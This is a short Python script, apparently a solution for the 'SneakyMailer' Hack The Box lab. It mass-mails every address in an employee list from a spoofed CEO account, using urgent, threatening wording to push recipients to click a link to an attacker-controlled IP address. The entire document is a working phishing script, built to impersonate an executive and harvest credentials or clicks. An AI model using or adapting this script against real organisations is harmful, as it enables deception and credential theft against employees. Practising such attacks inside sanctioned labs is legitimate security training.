#!/usr/bin/env python3

from smtplib import SMTP
from email.message import EmailMessage

with open('employee_emails.txt','r') as emailFile:
    emails = emailFile.read().split('\n')

message = ''
message += 'Hi there,\nWe require you to immediately open this link and verify the information. '
message += 'Make it quick or you\'ll be in trouble!\n\n'
message += 'http://10.10.14.120/'
message += '\n\nRegards,\nSneakymailer CEO'

for email in emails:
    
    msg = EmailMessage()
    msg.set_content(message)
    msg['Subject'] = 'Look at this immediately'
    msg['From'] = 'ceo@sneakymailer.htb'
    msg['To'] = email

    print(f'Sending to: {email}', end='')

    with SMTP('sneakymailer.htb') as server:
        server.send_message(msg)
        print(' - message sent!')
